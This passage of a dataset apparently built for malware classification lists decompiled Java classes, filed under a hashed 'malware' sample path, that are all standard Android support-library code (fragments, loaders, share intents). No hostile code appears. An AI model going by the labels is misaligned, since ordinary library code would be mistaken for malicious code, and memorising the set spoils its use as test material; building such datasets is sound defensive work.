this.mFragmentManager=manager;     this.mContainerId=containerId;     ensureContent();     this.mRealTabContent.setId(containerId);     if (getId() == -1) {       setId(R.id.tabhost);     }   }   private void ensureContent(){     if (this.mRealTabContent == null) {       this.mRealTabContent=(FrameLayout)findViewById(this.mContainerId);       if (this.mRealTabContent == null) {         throw new IllegalStateException(""No tab content FrameLayout found for id "" + this.mContainerId);       }     }   }   @Override public void setOnTabChangedListener(  TabHost.OnTabChangeListener l){     this.mOnTabChangeListener=l;   }   public void addTab(  TabHost.TabSpec tabSpec,  Class<?> clss,  Bundle args){     tabSpec.setContent(new DummyTabFactory(this.mContext));     String tag=tabSpec.getTag();     TabInfo info=new TabInfo(tag,clss,args);     if (this.mAttached) {       info.fragment=this.mFragmentManager.findFragmentByTag(tag);       if (info.fragment != null && !info.fragment.isDetached()) {         FragmentTransaction ft=this.mFragmentManager.beginTransaction();         ft.detach(info.fragment);         ft.commit();       }     }     this.mTabs.add(info);     addTab(tabSpec);   }   @Override protected void onAttachedToWindow(){     super.onAttachedToWindow();     String currentTab=getCurrentTabTag();     FragmentTransaction ft=null;     for (int i=0; i < this.mTabs.size(); i++) {       TabInfo tab=this.mTabs.get(i);       tab.fragment=this.mFragmentManager.findFragmentByTag(tab.tag);       if (tab.fragment != null && !tab.fragment.isDetached()) {         if (tab.tag.equals(currentTab)) {           this.mLastTab=tab;         }  else {           if (ft == null) {             ft=this.mFragmentManager.beginTransaction();           }           ft.detach(tab.fragment);         }       }     }     this.mAttached=true;     FragmentTransaction ft2=doTabChanged(currentTab,ft);     if (ft2 != null) {       ft2.commit();       this.mFragmentManager.executePendingTransactions();     }   }   @Override protected void onDetachedFromWindow(){     super.onDetachedFromWindow();     this.mAttached=false;   }   @Override protected Parcelable onSaveInstanceState(){     Parcelable superState=super.onSaveInstanceState();     SavedState ss=new SavedState(superState);     ss.curTab=getCurrentTabTag();     return ss;   }   @Override protected void onRestoreInstanceState(  Parcelable state){     SavedState ss=(SavedState)state;     super.onRestoreInstanceState(ss.getSuperState());     setCurrentTabByTag(ss.curTab);   }   @Override public void onTabChanged(  String tabId){     FragmentTransaction ft;     if (this.mAttached && (ft=doTabChanged(tabId,null)) != null) {       ft.commit();     }     if (this.mOnTabChangeListener != null) {       this.mOnTabChangeListener.onTabChanged(tabId);     }   }   private FragmentTransaction doTabChanged(  String tabId,  FragmentTransaction ft){     TabInfo newTab=null;     for (int i=0; i < this.mTabs.size(); i++) {       TabInfo tab=this.mTabs.get(i);       if (tab.tag.equals(tabId)) {         newTab=tab;       }     }     if (newTab == null) {       throw new IllegalStateException(""No tab known for tag "" + tabId);     }     if (this.mLastTab != newTab) {       if (ft == null) {         ft=this.mFragmentManager.beginTransaction();       }       if (this.mLastTab != null && this.mLastTab.fragment != null) {         ft.detach(this.mLastTab.fragment);       }       if (newTab != null) {         if (newTab.fragment == null) {           newTab.fragment=Fragment.instantiate(this.mContext,newTab.clss.getName(),newTab.args);           ft.add(this.mContainerId,newTab.fragment,newTab.tag);         }  else {           ft.attach(newTab.fragment);         }       }       this.mLastTab=newTab;     }     return ft;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\FragmentTag.code","static class FragmentTag {   public static final int[] Fragment={R.attr.name,R.attr.id,R.attr.tag};   public static final int Fragment_id=1;   public static final int Fragment_name=0;   public static final int Fragment_tag=2;   FragmentTag(){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\FragmentTransaction.code","public abstract class FragmentTransaction {   public static final int TRANSIT_ENTER_MASK=4096;   public static final int TRANSIT_EXIT_MASK=8192;   public static final int TRANSIT_FRAGMENT_CLOSE=8194;   public static final int TRANSIT_FRAGMENT_FADE=4099;   public static final int TRANSIT_FRAGMENT_OPEN=4097;   public static final int TRANSIT_NONE=0;   public static final int TRANSIT_UNSET=-1;   public abstract FragmentTransaction add(  int i,  Fragment fragment);   public abstract FragmentTransaction add(  int i,  Fragment fragment,  String str);   public abstract FragmentTransaction add(  Fragment fragment,  String str);   public abstract FragmentTransaction addToBackStack(  String str);   public abstract FragmentTransaction attach(  Fragment fragment);   public abstract int commit();   public abstract int commitAllowingStateLoss();   public abstract FragmentTransaction detach(  Fragment fragment);   public abstract FragmentTransaction disallowAddToBackStack();   public abstract FragmentTransaction hide(  Fragment fragment);   public abstract boolean isAddToBackStackAllowed();   public abstract boolean isEmpty();   public abstract FragmentTransaction remove(  Fragment fragment);   public abstract FragmentTransaction replace(  int i,  Fragment fragment);   public abstract FragmentTransaction replace(  int i,  Fragment fragment,  String str);   public abstract FragmentTransaction setBreadCrumbShortTitle(  int i);   public abstract FragmentTransaction setBreadCrumbShortTitle(  CharSequence charSequence);   public abstract FragmentTransaction setBreadCrumbTitle(  int i);   public abstract FragmentTransaction setBreadCrumbTitle(  CharSequence charSequence);   public abstract FragmentTransaction setCustomAnimations(  int i,  int i2);   public abstract FragmentTransaction setCustomAnimations(  int i,  int i2,  int i3,  int i4);   public abstract FragmentTransaction setTransition(  int i);   public abstract FragmentTransaction setTransitionStyle(  int i);   public abstract FragmentTransaction show(  Fragment fragment); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\InboxStyle.code","public static class InboxStyle extends Style {   ArrayList<CharSequence> mTexts=new ArrayList<>();   public InboxStyle(){   }   public InboxStyle(  Builder builder){     setBuilder(builder);   }   public InboxStyle setBigContentTitle(  CharSequence title){     this.mBigContentTitle=title;     return this;   }   public InboxStyle setSummaryText(  CharSequence cs){     this.mSummaryText=cs;     this.mSummaryTextSet=true;     return this;   }   public InboxStyle addLine(  CharSequence cs){     this.mTexts.add(cs);     return this;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\InstantiationException.code","public static class InstantiationException extends RuntimeException {   public InstantiationException(  String msg,  Exception cause){     super(msg,cause);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\IntentBuilder.code","public static class IntentBuilder {   private Activity mActivity;   private ArrayList<String> mBccAddresses;   private ArrayList<String> mCcAddresses;   private CharSequence mChooserTitle;   private Intent mIntent=new Intent().setAction(""android.intent.action.SEND"");   private ArrayList<Uri> mStreams;   private ArrayList<String> mToAddresses;   public static IntentBuilder from(  Activity launchingActivity){     return new IntentBuilder(launchingActivity);   }   private IntentBuilder(  Activity launchingActivity){     this.mActivity=launchingActivity;     this.mIntent.putExtra(ShareCompat.EXTRA_CALLING_PACKAGE,launchingActivity.getPackageName());     this.mIntent.putExtra(ShareCompat.EXTRA_CALLING_ACTIVITY,launchingActivity.getComponentName());     this.mIntent.addFlags(AccessibilityEventCompat.TYPE_GESTURE_DETECTION_END);   }   public Intent getIntent(){     if (this.mToAddresses != null) {       combineArrayExtra(""android.intent.extra.EMAIL"",this.mToAddresses);       this.mToAddresses=null;     }     if (this.mCcAddresses != null) {       combineArrayExtra(""android.intent.extra.CC"",this.mCcAddresses);       this.mCcAddresses=null;     }     if (this.mBccAddresses != null) {       combineArrayExtra(""android.intent.extra.BCC"",this.mBccAddresses);       this.mBccAddresses=null;     }     boolean needsSendMultiple=this.mStreams != null && this.mStreams.size() > 1;     boolean isSendMultiple=this.mIntent.getAction().equals(""android.intent.action.SEND_MULTIPLE"");     if (!needsSendMultiple && isSendMultiple) {       this.mIntent.setAction(""android.intent.action.SEND"");       if (this.mStreams != null && !this.mStreams.isEmpty()) {         this.mIntent.putExtra(""android.intent.extra.STREAM"",this.mStreams.get(0));       }  else {         this.mIntent.removeExtra(""android.intent.extra.STREAM"");       }       this.mStreams=null;     }     if (needsSendMultiple && !isSendMultiple) {       this.mIntent.setAction(""android.intent.action.SEND_MULTIPLE"");       if (this.mStreams != null && !this.mStreams.isEmpty()) {         this.mIntent.putParcelableArrayListExtra(""android.intent.extra.STREAM"",this.mStreams);       }  else {         this.mIntent.removeExtra(""android.intent.extra.STREAM"");       }     }     return this.mIntent;   }   Activity getActivity(){     return this.mActivity;   }   private void combineArrayExtra(  String extra,  ArrayList<String> add){     String[] currentAddresses=this.mIntent.getStringArrayExtra(extra);     int currentLength=currentAddresses != null ? currentAddresses.length : 0;     String[] finalAddresses=new String[add.size() + currentLength];     add.toArray(finalAddresses);     if (currentAddresses != null) {       System.arraycopy(currentAddresses,0,finalAddresses,add.size(),currentLength);     }     this.mIntent.putExtra(extra,finalAddresses);   }   private void combineArrayExtra(  String extra,  String[] add){     Intent intent=getIntent();     String[] old=intent.getStringArrayExtra(extra);     int oldLength=old != null ? old.length : 0;     String[] result=new String[add.length + oldLength];     if (old != null) {       System.arraycopy(old,0,result,0,oldLength);     }     System.arraycopy(add,0,result,oldLength,add.length);     intent.putExtra(extra,result);   }   public Intent createChooserIntent(){     return Intent.createChooser(getIntent(),this.mChooserTitle);   }   public void startChooser(){     this.mActivity.startActivity(createChooserIntent());   }   public IntentBuilder setChooserTitle(  CharSequence title){     this.mChooserTitle=title;     return this;   }   public IntentBuilder setChooserTitle(  int resId){     return setChooserTitle(this.mActivity.getText(resId));   }   public IntentBuilder setType(  String mimeType){     this.mIntent.setType(mimeType);     return this;   }   public IntentBuilder setText(  CharSequence text){     this.mIntent.putExtra(""android.intent.extra.TEXT"",text);     return this;   }   public IntentBuilder setHtmlText(  String htmlText){     this.mIntent.putExtra(IntentCompat.EXTRA_HTML_TEXT,htmlText);     if (!this.mIntent.hasExtra(""android.intent.extra.TEXT"")) {       setText(Html.fromHtml(htmlText));     }     return this;   }   public IntentBuilder setStream(  Uri streamUri){     if (!this.mIntent.getAction().equals(""android.intent.action.SEND"")) {       this.mIntent.setAction(""android.intent.action.SEND"");     }     this.mStreams=null;     this.mIntent.putExtra(""android.intent.extra.STREAM"",streamUri);     return this;   }   public IntentBuilder addStream(  Uri streamUri){     Uri currentStream=(Uri)this.mIntent.getParcelableExtra(""android.intent.extra.STREAM"");     if (currentStream == null) {       return setStream(streamUri);     }     if (this.mStreams == null) {       this.mStreams=new ArrayList<>();     }     if (currentStream != null) {       this.mIntent.removeExtra(""android.intent.extra.STREAM"");       this.mStreams.add(currentStream);     }     this.mStreams.add(streamUri);     return this;   }   public IntentBuilder setEmailTo(  String[] addresses){     if (this.mToAddresses != null) {       this.mToAddresses=null;     }     this.mIntent.putExtra(""android.intent.extra.EMAIL"",addresses);     return this;   }   public IntentBuilder addEmailTo(  String address){     if (this.mToAddresses == null) {       this.mToAddresses=new ArrayList<>();     }     this.mToAddresses.add(address);     return this;   }   public IntentBuilder addEmailTo(  String[] addresses){     combineArrayExtra(""android.intent.extra.EMAIL"",addresses);     return this;   }   public IntentBuilder setEmailCc(  String[] addresses){     this.mIntent.putExtra(""android.intent.extra.CC"",addresses);     return this;   }   public IntentBuilder addEmailCc(  String address){     if (this.mCcAddresses == null) {       this.mCcAddresses=new ArrayList<>();     }     this.mCcAddresses.add(address);     return this;   }   public IntentBuilder addEmailCc(  String[] addresses){     combineArrayExtra(""android.intent.extra.CC"",addresses);     return this;   }   public IntentBuilder setEmailBcc(  String[] addresses){     this.mIntent.putExtra(""android.intent.extra.BCC"",addresses);     return this;   }   public IntentBuilder addEmailBcc(  String address){     if (this.mBccAddresses == null) {       this.mBccAddresses=new ArrayList<>();     }     this.mBccAddresses.add(address);     return this;   }   public IntentBuilder addEmailBcc(  String[] addresses){     combineArrayExtra(""android.intent.extra.BCC"",addresses);     return this;   }   public IntentBuilder setSubject(  String subject){     this.mIntent.putExtra(""android.intent.extra.SUBJECT"",subject);     return this;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\IntentReader.code","public static class IntentReader {   private static final String TAG=""IntentReader"";   private Activity mActivity;   private ComponentName mCallingActivity;   private String mCallingPackage;   private Intent mIntent;   private ArrayList<Uri> mStreams;   public static IntentReader from(  Activity activity){     return new IntentReader(activity);   }   private IntentReader(  Activity activity){     this.mActivity=activity;     this.mIntent=activity.getIntent();     this.mCallingPackage=ShareCompat.getCallingPackage(activity);     this.mCallingActivity=ShareCompat.getCallingActivity(activity);   }   public boolean isShareIntent(){     String action=this.mIntent.getAction();     return ""android.intent.action.SEND"".equals(action) || ""android.intent.action.SEND_MULTIPLE"".equals(action);   }   public boolean isSingleShare(){     return ""android.intent.action.SEND"".equals(this.mIntent.getAction());   }   public boolean isMultipleShare(){     return ""android.intent.action.SEND_MULTIPLE"".equals(this.mIntent.getAction());   }   public String getType(){     return this.mIntent.getType();   }   public CharSequence getText(){     return this.mIntent.getCharSequenceExtra(""android.intent.extra.TEXT"");   }   public String getHtmlText(){     String result=this.mIntent.getStringExtra(IntentCompat.EXTRA_HTML_TEXT);     if (result == null) {       CharSequence text=getText();       if (text instanceof Spanned) {         return Html.toHtml((Spanned)text);       }       if (text != null) {         return ShareCompat.IMPL.escapeHtml(text);       }       return result;     }     return result;   }   public Uri getStream(){     return (Uri)this.mIntent.getParcelableExtra(""android.intent.extra.STREAM"");   }   public Uri getStream(  int index){     if (this.mStreams == null && isMultipleShare()) {       this.mStreams=this.mIntent.getParcelableArrayListExtra(""android.intent.extra.STREAM"");     }     if (this.mStreams != null) {       return this.mStreams.get(index);     }     if (index == 0) {       return (Uri)this.mIntent.getParcelableExtra(""android.intent.extra.STREAM"");     }     throw new IndexOutOfBoundsException(""Stream items available: "" + getStreamCount() + "" index requested: ""+ index);   }   public int getStreamCount(){     if (this.mStreams == null && isMultipleShare()) {       this.mStreams=this.mIntent.getParcelableArrayListExtra(""android.intent.extra.STREAM"");     }     if (this.mStreams != null) {       return this.mStreams.size();     }     return this.mIntent.hasExtra(""android.intent.extra.STREAM"") ? 1 : 0;   }   public String[] getEmailTo(){     return this.mIntent.getStringArrayExtra(""android.intent.extra.EMAIL"");   }   public String[] getEmailCc(){     return this.mIntent.getStringArrayExtra(""android.intent.extra.CC"");   }   public String[] getEmailBcc(){     return this.mIntent.getStringArrayExtra(""android.intent.extra.BCC"");   }   public String getSubject(){     return this.mIntent.getStringExtra(""android.intent.extra.SUBJECT"");   }   public String getCallingPackage(){     return this.mCallingPackage;   }   public ComponentName getCallingActivity(){     return this.mCallingActivity;   }   public Drawable getCallingActivityIcon(){     if (this.mCallingActivity == null) {       return null;     }     PackageManager pm=this.mActivity.getPackageManager();     try {       return pm.getActivityIcon(this.mCallingActivity);     }  catch (    PackageManager.NameNotFoundException e) {       Log.e(TAG,""Could not retrieve icon for calling activity"",e);       return null;     }   }   public Drawable getCallingApplicationIcon(){     if (this.mCallingPackage == null) {       return null;     }     PackageManager pm=this.mActivity.getPackageManager();     try {       return pm.getApplicationIcon(this.mCallingPackage);     }  catch (    PackageManager.NameNotFoundException e) {       Log.e(TAG,""Could not retrieve icon for calling application"",e);       return null;     }   }   public CharSequence getCallingApplicationLabel(){     if (this.mCallingPackage == null) {       return null;     }     PackageManager pm=this.mActivity.getPackageManager();     try {       return pm.getApplicationLabel(pm.getApplicationInfo(this.mCallingPackage,0));     }  catch (    PackageManager.NameNotFoundException e) {       Log.e(TAG,""Could not retrieve label for calling application"",e);       return null;     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\ListFragment.code","public class ListFragment extends Fragment {   static final int INTERNAL_EMPTY_ID=16711681;   static final int INTERNAL_LIST_CONTAINER_ID=16711683;   static final int INTERNAL_PROGRESS_CONTAINER_ID=16711682;   ListAdapter mAdapter;   CharSequence mEmptyText;   View mEmptyView;   ListView mList;   View mListContainer;   boolean mListShown;   View mProgressContainer;   TextView mStandardEmptyView;   private final Handler mHandler=new Handler();   private final Runnable mRequestFocus=new Runnable(){     @Override public void run(){       ListFragment.this.mList.focusableViewAvailable(ListFragment.this.mList);     }   } ;   private final AdapterView.OnItemClickListener mOnClickListener=new AdapterView.OnItemClickListener(){     @Override public void onItemClick(    AdapterView<?> parent,    View v,    int position,    long id){       ListFragment.this.onListItemClick((ListView)parent,v,position,id);     }   } ;   @Override public View onCreateView(  LayoutInflater inflater,  ViewGroup container,  Bundle savedInstanceState){     Context context=getActivity();     FrameLayout frameLayout=new FrameLayout(context);     LinearLayout pframe=new LinearLayout(context);     pframe.setId(INTERNAL_PROGRESS_CONTAINER_ID);     pframe.setOrientation(1);     pframe.setVisibility(8);     pframe.setGravity(17);     ProgressBar progress=new ProgressBar(context,null,R.attr.progressBarStyleLarge);     pframe.addView(progress,new FrameLayout.LayoutParams(-2,-2));     frameLayout.addView(pframe,new FrameLayout.LayoutParams(-1,-1));     FrameLayout lframe=new FrameLayout(context);     lframe.setId(INTERNAL_LIST_CONTAINER_ID);     TextView tv=new TextView(getActivity());     tv.setId(INTERNAL_EMPTY_ID);     tv.setGravity(17);     lframe.addView(tv,new FrameLayout.LayoutParams(-1,-1));     ListView lv=new ListView(getActivity());     lv.setId(R.id.list);     lv.setDrawSelectorOnTop(false);     lframe.addView(lv,new FrameLayout.LayoutParams(-1,-1));     frameLayout.addView(lframe,new FrameLayout.LayoutParams(-1,-1));     frameLayout.setLayoutParams(new FrameLayout.LayoutParams(-1,-1));     return frameLayout;   }   @Override public void onViewCreated(  View view,  Bundle savedInstanceState){     super.onViewCreated(view,savedInstanceState);     ensureList();   }   @Override public void onDestroyView(){     this.mHandler.removeCallbacks(this.mRequestFocus);     this.mList=null;     this.mListShown=false;     this.mListContainer=null;     this.mProgressContainer=null;     this.mEmptyView=null;     this.mStandardEmptyView=null;     super.onDestroyView();   }   public void onListItemClick(  ListView l,  View v,  int position,  long id){   }   public void setListAdapter(  ListAdapter adapter){     boolean hadAdapter=this.mAdapter != null;     this.mAdapter=adapter;     if (this.mList != null) {       this.mList.setAdapter(adapter);       if (!this.mListShown && !hadAdapter) {         setListShown(true,getView().getWindowToken() != null);       }     }   }   public void setSelection(  int position){     ensureList();     this.mList.setSelection(position);   }   public int getSelectedItemPosition(){     ensureList();     return this.mList.getSelectedItemPosition();   }   public long getSelectedItemId(){     ensureList();     return this.mList.getSelectedItemId();   }   public ListView getListView(){     ensureList();     return this.mList;   }   public void setEmptyText(  CharSequence text){     ensureList();     if (this.mStandardEmptyView == null) {       throw new IllegalStateException(""Can't be used with a custom content view"");     }     this.mStandardEmptyView.setText(text);     if (this.mEmptyText == null) {       this.mList.setEmptyView(this.mStandardEmptyView);     }     this.mEmptyText=text;   }   public void setListShown(  boolean shown){     setListShown(shown,true);   }   public void setListShownNoAnimation(  boolean shown){     setListShown(shown,false);   }   private void setListShown(  boolean shown,  boolean animate){     ensureList();     if (this.mProgressContainer == null) {       throw new IllegalStateException(""Can't be used with a custom content view"");     }     if (this.mListShown != shown) {       this.mListShown=shown;       if (shown) {         if (animate) {           this.mProgressContainer.startAnimation(AnimationUtils.loadAnimation(getActivity(),R.anim.fade_out));           this.mListContainer.startAnimation(AnimationUtils.loadAnimation(getActivity(),R.anim.fade_in));         }  else {           this.mProgressContainer.clearAnimation();           this.mListContainer.clearAnimation();         }         this.mProgressContainer.setVisibility(8);         this.mListContainer.setVisibility(0);         return;       }       if (animate) {         this.mProgressContainer.startAnimation(AnimationUtils.loadAnimation(getActivity(),R.anim.fade_in));         this.mListContainer.startAnimation(AnimationUtils.loadAnimation(getActivity(),R.anim.fade_out));       }  else {         this.mProgressContainer.clearAnimation();         this.mListContainer.clearAnimation();       }       this.mProgressContainer.setVisibility(0);       this.mListContainer.setVisibility(8);     }   }   public ListAdapter getListAdapter(){     return this.mAdapter;   }   private void ensureList(){     if (this.mList == null) {       View root=getView();       if (root == null) {         throw new IllegalStateException(""Content view not yet created"");       }       if (root instanceof ListView) {         this.mList=(ListView)root;       }  else {         this.mStandardEmptyView=(TextView)root.findViewById(INTERNAL_EMPTY_ID);         if (this.mStandardEmptyView == null) {           this.mEmptyView=root.findViewById(R.id.empty);         }  else {           this.mStandardEmptyView.setVisibility(8);         }         this.mProgressContainer=root.findViewById(INTERNAL_PROGRESS_CONTAINER_ID);         this.mListContainer=root.findViewById(INTERNAL_LIST_CONTAINER_ID);         View rawListView=root.findViewById(R.id.list);         if (!(rawListView instanceof ListView)) {           if (rawListView == null) {             throw new RuntimeException(""Your content must have a ListView whose id attribute is 'android.R.id.list'"");           }           throw new RuntimeException(""Content has view with id attribute 'android.R.id.list' that is not a ListView class"");         }         this.mList=(ListView)rawListView;         if (this.mEmptyView != null) {           this.mList.setEmptyView(this.mEmptyView);         }  else         if (this.mEmptyText != null) {           this.mStandardEmptyView.setText(this.mEmptyText);           this.mList.setEmptyView(this.mStandardEmptyView);         }       }       this.mListShown=true;       this.mList.setOnItemClickListener(this.mOnClickListener);       if (this.mAdapter != null) {         ListAdapter adapter=this.mAdapter;         this.mAdapter=null;         setListAdapter(adapter);       }  else       if (this.mProgressContainer != null) {         setListShown(false,false);       }       this.mHandler.post(this.mRequestFocus);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\LoaderCallbacks.code","public interface LoaderCallbacks<D> {   Loader<D> onCreateLoader(  int i,  Bundle bundle);   void onLoadFinished(  Loader<D> loader,  D d);   void onLoaderReset(  Loader<D> loader); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\LoaderInfo.code","public final class LoaderInfo implements Loader.OnLoadCompleteListener<Object> {   final Bundle mArgs;   LoaderManager.LoaderCallbacks<Object> mCallbacks;   Object mData;   boolean mDeliveredData;   boolean mDestroyed;   boolean mHaveData;   final int mId;   boolean mListenerRegistered;   Loader<Object> mLoader;   LoaderInfo mPendingLoader;   boolean mReportNextStart;   boolean mRetaining;   boolean mRetainingStarted;   boolean mStarted;   public LoaderInfo(  int id,  Bundle args,  LoaderManager.LoaderCallbacks<Object> callbacks){     this.mId=id;     this.mArgs=args;     this.mCallbacks=callbacks;   }   void start(){     if (this.mRetaining && this.mRetainingStarted) {       this.mStarted=true;       return;     }     if (!this.mStarted) {       this.mStarted=true;       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Starting: "" + this);       }       if (this.mLoader == null && this.mCallbacks != null) {         this.mLoader=this.mCallbacks.onCreateLoader(this.mId,this.mArgs);       }       if (this.mLoader != null) {         if (this.mLoader.getClass().isMemberClass() && !Modifier.isStatic(this.mLoader.getClass().getModifiers())) {           throw new IllegalArgumentException(""Object returned from onCreateLoader must not be a non-static inner member class: "" + this.mLoader);         }         if (!this.mListenerRegistered) {           this.mLoader.registerListener(this.mId,this);           this.mListenerRegistered=true;         }         this.mLoader.startLoading();       }     }   }   void retain(){     if (LoaderManagerImpl.DEBUG) {       Log.v(LoaderManagerImpl.TAG,""  Retaining: "" + this);     }     this.mRetaining=true;     this.mRetainingStarted=this.mStarted;     this.mStarted=false;     this.mCallbacks=null;   }   void finishRetain(){     if (this.mRetaining) {       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Finished Retaining: "" + this);       }       this.mRetaining=false;       if (this.mStarted != this.mRetainingStarted && !this.mStarted) {         stop();       }     }     if (this.mStarted && this.mHaveData && !this.mReportNextStart) {       callOnLoadFinished(this.mLoader,this.mData);     }   }   void reportStart(){     if (this.mStarted && this.mReportNextStart) {       this.mReportNextStart=false;       if (this.mHaveData) {         callOnLoadFinished(this.mLoader,this.mData);       }     }   }   void stop(){     if (LoaderManagerImpl.DEBUG) {       Log.v(LoaderManagerImpl.TAG,""  Stopping: "" + this);     }     this.mStarted=false;     if (!this.mRetaining && this.mLoader != null && this.mListenerRegistered) {       this.mListenerRegistered=false;       this.mLoader.unregisterListener(this);       this.mLoader.stopLoading();     }   }   void destroy(){     if (LoaderManagerImpl.DEBUG) {       Log.v(LoaderManagerImpl.TAG,""  Destroying: "" + this);     }     this.mDestroyed=true;     boolean needReset=this.mDeliveredData;     this.mDeliveredData=false;     if (this.mCallbacks != null && this.mLoader != null && this.mHaveData && needReset) {       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Reseting: "" + this);       }       String lastBecause=null;       if (LoaderManagerImpl.this.mActivity != null) {         lastBecause=LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause;         LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=""onLoaderReset"";       }       try {         this.mCallbacks.onLoaderReset(this.mLoader);       }   finally {         if (LoaderManagerImpl.this.mActivity != null) {           LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=lastBecause;         }       }     }     this.mCallbacks=null;     this.mData=null;     this.mHaveData=false;     if (this.mLoader != null) {       if (this.mListenerRegistered) {         this.mListenerRegistered=false;         this.mLoader.unregisterListener(this);       }       this.mLoader.reset();     }     if (this.mPendingLoader != null) {       this.mPendingLoader.destroy();     }   }   @Override public void onLoadComplete(  Loader<Object> loader,  Object data){     if (LoaderManagerImpl.DEBUG) {       Log.v(LoaderManagerImpl.TAG,""onLoadComplete: "" + this);     }     if (this.mDestroyed) {       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Ignoring load complete -- destroyed"");         return;       }       return;     }     if (LoaderManagerImpl.this.mLoaders.get(this.mId) != this) {       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Ignoring load complete -- not active"");         return;       }       return;     }     LoaderInfo pending=this.mPendingLoader;     if (pending != null) {       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Switching to pending loader: "" + pending);       }       this.mPendingLoader=null;       LoaderManagerImpl.this.mLoaders.put(this.mId,null);       destroy();       LoaderManagerImpl.this.installLoader(pending);       return;     }     if (this.mData != data || !this.mHaveData) {       this.mData=data;       this.mHaveData=true;       if (this.mStarted) {         callOnLoadFinished(loader,data);       }     }     LoaderInfo info=LoaderManagerImpl.this.mInactiveLoaders.get(this.mId);     if (info != null && info != this) {       info.mDeliveredData=false;       info.destroy();       LoaderManagerImpl.this.mInactiveLoaders.remove(this.mId);     }     if (LoaderManagerImpl.this.mActivity != null && !LoaderManagerImpl.this.hasRunningLoaders()) {       LoaderManagerImpl.this.mActivity.mFragments.startPendingDeferredFragments();     }   }   void callOnLoadFinished(  Loader<Object> loader,  Object data){     if (this.mCallbacks != null) {       String lastBecause=null;       if (LoaderManagerImpl.this.mActivity != null) {         lastBecause=LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause;         LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=""onLoadFinished"";       }       try {         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  onLoadFinished in "" + loader + "": ""+ loader.dataToString(data));         }         this.mCallbacks.onLoadFinished(loader,data);         this.mDeliveredData=true;       }   finally {         if (LoaderManagerImpl.this.mActivity != null) {           LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=lastBecause;         }       }     }   }   public String toString(){     StringBuilder sb=new StringBuilder(64);     sb.append(""LoaderInfo{"");     sb.append(Integer.toHexString(System.identityHashCode(this)));     sb.append("" #"");     sb.append(this.mId);     sb.append("" : "");     DebugUtils.buildShortClassTag(this.mLoader,sb);     sb.append(""}}"");     return sb.toString();   }   public void dump(  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     writer.print(prefix);     writer.print(""mId="");     writer.print(this.mId);     writer.print("" mArgs="");     writer.println(this.mArgs);     writer.print(prefix);     writer.print(""mCallbacks="");     writer.println(this.mCallbacks);     writer.print(prefix);     writer.print(""mLoader="");     writer.println(this.mLoader);     if (this.mLoader != null) {       this.mLoader.dump(prefix + ""  "",fd,writer,args);     }     if (this.mHaveData || this.mDeliveredData) {       writer.print(prefix);       writer.print(""mHaveData="");       writer.print(this.mHaveData);       writer.print(""  mDeliveredData="");       writer.println(this.mDeliveredData);       writer.print(prefix);       writer.print(""mData="");       writer.println(this.mData);     }     writer.print(prefix);     writer.print(""mStarted="");     writer.print(this.mStarted);     writer.print("" mReportNextStart="");     writer.print(this.mReportNextStart);     writer.print("" mDestroyed="");     writer.println(this.mDestroyed);     writer.print(prefix);     writer.print(""mRetaining="");     writer.print(this.mRetaining);     writer.print("" mRetainingStarted="");     writer.print(this.mRetainingStarted);     writer.print("" mListenerRegistered="");     writer.println(this.mListenerRegistered);     if (this.mPendingLoader != null) {       writer.print(prefix);       writer.println(""Pending Loader "");       writer.print(this.mPendingLoader);       writer.println("":"");       this.mPendingLoader.dump(prefix + ""  "",fd,writer,args);     }   } } "
